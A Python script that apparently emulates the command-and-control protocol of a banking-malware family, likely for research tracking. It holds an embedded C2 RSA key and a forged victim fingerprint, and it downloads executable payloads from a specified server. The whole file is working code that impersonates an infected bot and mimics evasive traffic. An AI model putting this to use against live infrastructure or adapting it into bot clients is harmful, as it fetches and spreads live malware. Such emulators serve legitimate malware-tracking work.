#!/usr/bin/env python3

import os
import string
import random
import requests
import requests_toolbelt
import struct

from cryptography.hazmat.primitives.asymmetric.padding import MGF1, OAEP, PKCS1v15
from cryptography.hazmat.primitives.ciphers import Cipher
from cryptography.hazmat.primitives.ciphers.algorithms import AES
from cryptography.hazmat.primitives.ciphers.modes import CBC
from cryptography.hazmat.primitives.hashes import Hash, SHA1
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.primitives.serialization import load_der_public_key


def _force_bytes(s):
    return s if isinstance(s, bytes) else str(s).encode('utf-8')


class BaseClient:
    C2_PUBLIC_KEY_DER = b"0h\x02a\x00\xe6}|\xb2|R\xb249\x95\x11\xa4\xfb\x11\xdd\xe8" \
        b"\xa3\x03'\xcf\x8f|\xfa\xb9.\xf9\x7fh\xa0\x99\x81V\xd9\xa5\xa05\xc1H"    \
        b"\xce\xc0\x18BW\x8a\xcc='\x94!G:\x8e\xd9\x7f\xcf\xf8\xc1\x8d\x94[@\x89"  \
        b"\xe1\xd2D\x1eq?<ys\xea\xe3d\xde\x9cc\x9b\xba8x \xf2\x88\x96\xf3\x7f"    \
        b"\xe94\x038\xe5\xd2\xaex\x15\x02\x03\x01\x00\x01"

    SESSION_KEY_SIZE = 16

    def __init__(self, session_key=None):
        if session_key:
            assert len(session_key) == self.SESSION_KEY_SIZE
        self.c2_public_key = load_der_public_key(self.C2_PUBLIC_KEY_DER)
        self.session_key = session_key or os.urandom(self.SESSION_KEY_SIZE)
        self.session_key_algorithm = AES(self.session_key)
        self.session_key_cipher = Cipher(self.session_key_algorithm, CBC(b'\0' * (self.session_key_algorithm.block_size // 8)))
        self.session_key_padding = PKCS7(self.session_key_algorithm.block_size)
        self.digest_algorithm = SHA1()

    #
    # Request
    #

    def serialize_request_payload(self, request_paylod):
        raise NotImplementedError

    def compress_request_payload(self, serialized_request_payload):
        # dummy compression
        decompressed = memoryview(serialized_request_payload)
        compressed = bytearray()
        while len(decompressed) > 0:
            size = min(len(decompressed), 0x20)
            compressed += struct.pack('<B%ds' % size, size - 1, bytes(decompressed[:size]))
            decompressed = decompressed[size:]
        compressed_request_payload = bytes(compressed)
        return compressed_request_payload

    def serialize_request(self, request_flags, compressed_request_payload):
        serialized_request = struct.pack(
            '<II%ds' % len(compressed_request_payload),
            request_flags,
            len(compressed_request_payload),
            compressed_request_payload,
        )
        return serialized_request

    def encrypt_request(self, serialized_request):
        padder = self.session_key_padding.padder()
        serialized_request_padded = padder.update(serialized_request) + padder.finalize()
        encryptor = self.session_key_cipher.encryptor()
        serialized_request_ciphertext = encryptor.update(serialized_request_padded) + encryptor.finalize()
        hasher = Hash(self.digest_algorithm)
        hasher.update(serialized_request)
        serialized_request_digest = hasher.finalize()
        session_key_ciphertext = self.c2_public_key.encrypt(
            self.session_key,
            OAEP(MGF1(self.digest_algorithm), self.digest_algorithm, None),
        )
        session_key_ciphertext_size = self.c2_public_key.key_size // 8
        serialized_request_digest_size = self.digest_algorithm.digest_size
        serialized_request_ciphertext_size = len(serialized_request_ciphertext)
        encrypted_request = struct.pack(
            '<%ds%ds%ds' % (
                session_key_ciphertext_size,
                serialized_request_digest_size,
                serialized_request_ciphertext_size
            ),
            session_key_ciphertext,
            serialized_request_digest,
            serialized_request_ciphertext,
        )
        return encrypted_request

    #
    # Response
    #

    def decrypt_response(self, encrypted_response):
        compressed_response_signature_size = self.c2_public_key.key_size // 8
        compressed_response_digest_size = self.digest_algorithm.digest_size  # unused
        compressed_response_ciphertext_size = len(encrypted_response) - compressed_response_signature_size - compressed_response_digest_size
        compressed_response_signature, compressed_response_ciphertext = struct.unpack(
            '<%ds%dx%ds' % (
                compressed_response_signature_size,
                compressed_response_digest_size,
                compressed_response_ciphertext_size,
            ),
            encrypted_response
        )
        compressed_response_signature = bytes(reversed(compressed_response_signature))
        decryptor = self.session_key_cipher.decryptor()
        compressed_response_padded = decryptor.update(compressed_response_ciphertext) + decryptor.finalize()
        unpadder = self.session_key_padding.unpadder()
        compressed_response = unpadder.update(compressed_response_padded) + unpadder.finalize()
        self.c2_public_key.verify(compressed_response_signature, compressed_response, PKCS1v15(), self.digest_algorithm)
        return compressed_response

    def decompress_response(self, compressed_response):
        compressed = memoryview(compressed_response[4:])
        decompressed = bytearray()
        while len(compressed) != 0:
            size = struct.unpack('<B', compressed[:1])[0]
            compressed = compressed[1:]
            if size < 0x20:
                size += 1
                src = compressed
                src_offset = 0
                compressed = compressed[size:]
            else:
                src_offset_hi = size & 0x1f
                size >>= 5
                if size == 7:
                    size += struct.unpack('<B', compressed[:1])[0]
                    compressed = compressed[1:]
                size += 2
                src = decompressed
                src_offset_lo = struct.unpack('<B', compressed[:1])[0]
                src_offset = -((src_offset_hi << 8) + src_offset_lo + 1)
                if len(src) < -src_offset:
                    raise Exception('len(src) < -src_offset')
                src_offset -= size
                compressed = compressed[1:]
            decompressed += bytearray(size)
            for i in range(size):
                decompressed[-size + i] = src[src_offset + i]
        serialized_response = bytes(decompressed)
        serialized_response_size = struct.unpack('<I', compressed_response[:4])[0]
        if serialized_response_size != len(serialized_response):
            raise Exception('serialized_response_size != len(serialized_response)')
        return serialized_response

    def deserialize_response(self, serialized_response):
        tmp = memoryview(serialized_response)
        serialized_response_payload_size = struct.unpack('<I', tmp[:4])[0]
        tmp = tmp[4:]
        serialized_response_payload = struct.unpack('<%ds' % serialized_response_payload_size, tmp[:serialized_response_payload_size])[0]
        tmp = tmp[serialized_response_payload_size:]
        response_flags = struct.unpack('<I', tmp[:4])[0]
        tmp = tmp[4:]  # len(tmp) > 0
        return serialized_response_payload, response_flags

    def deserialize_response_payload(self, serialized_response_payload):
        raise NotImplementedError

    #
    # Communication
    #

    def prepare_http_request(self, host, port, encrypted_request, path=None, user_agent=None, boundary=None, field_name=None, file_name=None):
        if not path:
            path_segment_count = random.randint(1, 6)
            path = ''
            for i in range(path_segment_count):
                path_segment_length = random.randint(4, 19)
                path += ''.join(random.choices(string.ascii_letters + string.digits, k=path_segment_length)) + '/'
        if not user_agent:
            user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)'
        if not boundary:
            hyphen_count = random.randint(8, 23)
            alnum_count = random.randint(8, 23)
            boundary = '%s%s' % ('-' * hyphen_count, ''.join(random.choices(string.ascii_letters + string.digits, k=alnum_count)))
        if not field_name:
            field_name_length = random.randint(4, 19)
            field_name = ''.join(random.choices(string.ascii_lowercase, k=field_name_length))
        if not file_name:
            file_name_length = random.randint(4, 19)
            file_name = ''.join(random.choices(string.ascii_lowercase, k=file_name_length))
        url = 'http://%s:%d/%s' % (host, port, path)
        fields = {field_name: (file_name, encrypted_request, 'application/octet-stream')}
        multipart_encoder = requests_toolbelt.MultipartEncoder(fields=fields, boundary=boundary)
        data = multipart_encoder.to_string()
        data = data.rstrip(b'\r\n') + b'\0' * (len(encrypted_request) + 0x1000 - multipart_encoder.len)  # strip last \r\n, pad with null bytes (length must be len(payload) + 0x1000)
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Referer': '%s/' % host,
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': multipart_encoder.content_type,
            'User-Agent': user_agent,
            'Cache-Control': 'no-cache',
        }
        request = requests.Request('POST', url, data=data, headers=headers)
        return request.prepare()

    def communicate_with_c2(self, host, port, request_flags, request_payload, timeout=None, debug_callback=None):
        serialized_request_payload = self.serialize_request_payload(request_payload)
        compressed_request_payload = self.compress_request_payload(serialized_request_payload)
        serialized_request = self.serialize_request(request_flags, compressed_request_payload)
        encrypted_request = self.encrypt_request(serialized_request)
        #
        http_request = self.prepare_http_request(host, port, encrypted_request)
        http_response = requests.Session().send(http_request, timeout=timeout)
        if debug_callback:
            debug_callback(http_request, http_response)
        http_response.raise_for_status()
        if len(http_response.content) < 0x74:
            raise Exception('len(http_response.content) < 0x74')
        encrypted_response = http_response.content
        #
        compressed_response = self.decrypt_response(encrypted_response)
        serialized_response = self.decompress_response(compressed_response)
        serialized_response_payload, response_flags = self.deserialize_response(serialized_response)
        response_payload = self.deserialize_response_payload(serialized_response_payload)
        return response_flags, response_payload


class MainClient(BaseClient):
    def serialize_request_payload(self, request_paylod):
        serialized_request_payload = struct.pack(
            '<I%dsIIIII%dsI%dsI' % (
                len(request_paylod['system_id']),
                len(request_paylod['other_process_executable_names']),
                len(request_paylod['payload_ids']),
            ),
            len(request_paylod['system_id']),
            _force_bytes(request_paylod['system_id']),
            request_paylod['system_info'],
            request_paylod['rdp_session_id'],
            request_paylod['date'],
            request_paylod['value_1000'],
            len(request_paylod['other_process_executable_names']),
            _force_bytes(request_paylod['other_process_executable_names']),
            len(request_paylod['payload_ids']),
            _force_bytes(request_paylod['payload_ids']),
            request_paylod['current_process_executable_path_hash'],
        )
        return serialized_request_payload

    def deserialize_response_payload(self, serialized_response_payload):
        tmp = memoryview(serialized_response_payload)
        payloads = []
        while True:
            if len(tmp) < 4:
                break
            size = struct.unpack('<I', tmp[:4])[0]
            tmp = tmp[4:]
            if len(tmp) < size:
                break
            payload_id, payload_type, payload_size = struct.unpack('<III', tmp[:12])
            tmp = tmp[12:]
            payload = struct.unpack('<%ds' % payload_size, tmp[:payload_size])[0]
            tmp = tmp[payload_size:]
            payloads.append((payload_id, payload_type, payload))
        return payloads


#
# Test main
#

def _main(host, port, request_flags, request_payload, output_dir, timeout):
    client = MainClient()

    def debug_callback(http_request, http_response):
        debug_dir = os.path.join(output_dir, 'debug')
        os.makedirs(debug_dir, exist_ok=True)
        with open(os.path.join(debug_dir, 'session_key.bin'), 'wb') as f:
            f.write(client.session_key)
        with open(os.path.join(debug_dir, 'request_url.txt'), 'w') as f:
            f.write('%s\n' % http_request.url)
        with open(os.path.join(debug_dir, 'request_headers.txt'), 'w') as f:
            for key, value in http_request.headers.items():
                f.write('%s: %s\n' % (key, value))
        with open(os.path.join(debug_dir, 'request_body.bin'), 'wb') as f:
            f.write(http_request.body)
        with open(os.path.join(debug_dir, 'response_status_code.txt'), 'w') as f:
            f.write('%d\n' % http_response.status_code)
        with open(os.path.join(debug_dir, 'response_headers.txt'), 'w') as f:
            for key, value in http_response.headers.items():
                f.write('%s: %s\n' % (key, value))
        with open(os.path.join(debug_dir, 'response_body.bin'), 'wb') as f:
            f.write(http_response.content)

    response_flags, response_payload = client.communicate_with_c2(
        host, port, request_flags, request_payload,
        timeout=timeout,
        debug_callback=debug_callback
    )

    os.makedirs(output_dir, exist_ok=True)
    with open(os.path.join(output_dir, 'flags.txt'), 'w') as f:
        f.write('%s\n' % hex(response_flags))
    for payload_id, payload_type, payload in response_payload:
        filename = '%d_%d.%s' % (payload_id, payload_type, 'dll' if payload_type == 3 else 'exe')
        with open(os.path.join(output_dir, filename), 'wb') as f:
            f.write(payload)


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 4:
        print('%s <host> <port> <output_dir>' % sys.argv[0])
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    output_dir = sys.argv[3]

    request_flags = 1
    request_payload = {
        'system_id': 'DESKTOPXK1C601_B4A6FEC6',
        'system_info': 110009,  # osVersionInfo.wProductType * 100000 + osVersionInfo.dwMajorVersion * 1000 + osVersionInfo.dwMinorVersion * 100 + systemInfo.wProcessorArchitecture
        'rdp_session_id': 0x1,
        'date': 20200416,
        'value_1000': 1000,
        'other_process_executable_names': \
            'SearchFilterHost.exe,SearchProtocolHost.exe,Taskmgr.exe,conhost.exe,powershell.exe,' \
            'notepad.exe,dllhost.exe,SecHealthUI.exe,Microsoft.Photos.exe,SystemSettings.exe,' \
            'WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe,WinStore.App.exe,' \
            'SecurityHealthService.exe,SecurityHealthSystray.exe,SgrmBroker.exe,SearchIndexer.exe,' \
            'MicrosoftEdgeSH.exe,MicrosoftEdgeCP.exe,Windows.WARP.JITService.exe,browser_broker.exe,' \
            'SkypeBackgroundHost.exe,YourPhone.exe,MicrosoftEdge.exe,ApplicationFrameHost.exe,RuntimeBroker.exe,' \
            'SearchUI.exe,ShellExperienceHost.exe,explorer.exe,ctfmon.exe,taskhostw.exe,sihost.exe,wlms.exe,' \
            'MsMpEng.exe,ruby.exe,spoolsv.exe,Memory Compression,dwm.exe,svchost.exe,fontdrvhost.exe,lsass.exe,' \
            'services.exe,winlogon.exe,wininit.exe,csrss.exe,smss.exe,Registry',
        'payload_ids': b'',
        'current_process_executable_path_hash': 0x9f955b9,
    }

    _main(host, port, request_flags, request_payload, output_dir, timeout=4)
